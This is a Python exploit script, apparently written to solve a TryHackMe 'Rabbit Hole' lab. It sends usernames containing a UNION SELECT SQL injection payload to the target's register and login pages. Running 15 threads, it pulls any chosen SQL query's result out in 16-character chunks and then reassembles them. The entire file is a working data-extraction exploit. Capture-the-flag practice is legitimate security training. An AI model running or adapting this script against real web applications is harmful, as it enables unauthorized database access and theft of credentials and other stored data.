#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
import threading
import time

# Initialize session and result storage
sessions = {}
results = {}

# Function to send POST request (register or login)
def send_request(action, sqli_payload, password):
    url = f'http://rabbithole.thm/{action}.php'
    data = {
        'username': sqli_payload,
        'password': password,
        'submit' if action == 'register' else 'login': 'Submit Query'
    }
    return requests.post(url, data=data)

# Function to handle registration and login with SQLi payload
def create_and_login(i, sqli_payload):
    password = 'abc'
    
    # Try to register first
    register_response = send_request('register', sqli_payload, password)

    # Check if registration failed, but proceed with login
    if "Something went wrong" in register_response.text:
        print(f"Thread {i}: Registration failed, but proceeding with login...")

    # Proceed with login
    login_response = send_request('login', sqli_payload, password)

    # Parse HTML response using BeautifulSoup
    soup = BeautifulSoup(login_response.text, 'html.parser')
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    
    # Store the result
    results[i] = output

    return

# Function to collect the final result from all threads
def fetch_final_result():
    # Check that we have all the results
    if all([len(results[i]) <= len(results[i - 1]) for i in range(1, len(results))]):
        result = "".join([results[i] for i in range(0, len(results))])
        if len(result) > 16:
            print("Final extracted data:", result)
            sys.exit(0)
    
    time.sleep(1)

# Main script execution
def main():
    username_input = input("Enter username: ")

    threads = []
    for i in range(15):
        sqli_payload = f'" UNION SELECT 2,SUBSTR(({username_input}), {i * 16 + 1}, 16);#'
        thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete the registration and login process
    for thread in threads:
        thread.join()

    # Continuously fetch the final result from all threads
    while True:
        fetch_final_result()

# Run the main function
if __name__ == "__main__":
    main()
